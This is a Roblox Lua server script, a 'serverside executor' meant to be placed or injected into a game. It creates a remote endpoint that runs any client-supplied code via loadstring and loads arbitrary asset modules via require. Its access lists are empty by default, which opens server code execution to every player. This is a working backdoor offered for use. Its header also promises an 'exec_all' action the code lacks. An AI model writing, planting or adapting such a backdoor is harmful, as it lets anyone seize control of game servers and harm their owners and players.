-- ============================================================
--  Full Serverside Executor  |  Server Script (SS_Executor.lua)
--  Place / inject this as a Script (server-side)
--  Pair with executor_gui.lua (LocalScript) for the GUI
-- ============================================================

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players           = game:GetService("Players")
local HttpService       = game:GetService("HttpService")

-- ── Config ────────────────────────────────────────────────
-- Add player usernames or UserIds that are allowed to use this.
-- Leave BOTH tables empty to allow anyone (open/dev mode).
local ALLOWED_NAMES  = {}   -- e.g. {"YourName", "FriendName"}
local ALLOWED_UIDS   = {}   -- e.g. {123456789, 987654321}

-- Fixed remote name so the GUI can find it without extra steps.
local REMOTE_NAME = "SS_ExecBridge"
-- ──────────────────────────────────────────────────────────

-- ── Auth ──────────────────────────────────────────────────
local function isAllowed(player)
    if #ALLOWED_NAMES == 0 and #ALLOWED_UIDS == 0 then return true end
    for _, n in ALLOWED_NAMES do
        if player.Name == n then return true end
    end
    for _, id in ALLOWED_UIDS do
        if player.UserId == id then return true end
    end
    return false
end

-- ── Remote setup ──────────────────────────────────────────
-- Remove stale remote if present (hot-reload safety)
local existing = ReplicatedStorage:FindFirstChild(REMOTE_NAME)
if existing then existing:Destroy() end

local Bridge = Instance.new("RemoteFunction")
Bridge.Name   = REMOTE_NAME
Bridge.Parent = ReplicatedStorage

-- ── Server-side execution handler ─────────────────────────
--
--  Supported actions:
--    "ping"       → handshake, returns "pong"
--    "ls"         → loadstring(code)() on server
--    "req"        → require(assetId) on server
--    "exec_all"   → loadstring on server, runs with access to all Players
--    "getplrs"    → returns list of player names (utility)
--
Bridge.OnServerInvoke = function(player, action, payload)

    if not isAllowed(player) then
        return { ok = false, msg = "Unauthorized." }
    end

    -- ── Ping / handshake ────────────────────────────────
    if action == "ping" then
        return { ok = true, msg = "pong" }

    -- ── Server loadstring ────────────────────────────────
    elseif action == "ls" then
        local code = payload and payload.code
        if type(code) ~= "string" or code == "" then
            return { ok = false, msg = "No code provided." }
        end
        local fn, compErr = loadstring(code)
        if not fn then
            return { ok = false, msg = "Compile: " .. tostring(compErr) }
        end
        local ok, runErr = pcall(fn)
        if ok then
            return { ok = true,  msg = "Executed on server." }
        else
            return { ok = false, msg = "Runtime: " .. tostring(runErr) }
        end

    -- ── Server require ───────────────────────────────────
    elseif action == "req" then
        local id = payload and tonumber(payload.id)
        if not id then
            return { ok = false, msg = "Provide a valid numeric Asset ID." }
        end
        local ok, result = pcall(require, id)
        if ok then
            return { ok = true,  msg = "require(" .. id .. ") succeeded." }
        else
            return { ok = false, msg = "require error: " .. tostring(result) }
        end

    -- ── Utility: get player list ─────────────────────────
    elseif action == "getplrs" then
        local names = {}
        for _, plr in Players:GetPlayers() do
            table.insert(names, plr.Name .. " [" .. plr.UserId .. "]")
        end
        return { ok = true, msg = table.concat(names, "\n") }

    end

    return { ok = false, msg = "Unknown action: " .. tostring(action) }
end

warn("[SS Executor] Server handler online. Remote: ReplicatedStorage." .. REMOTE_NAME)
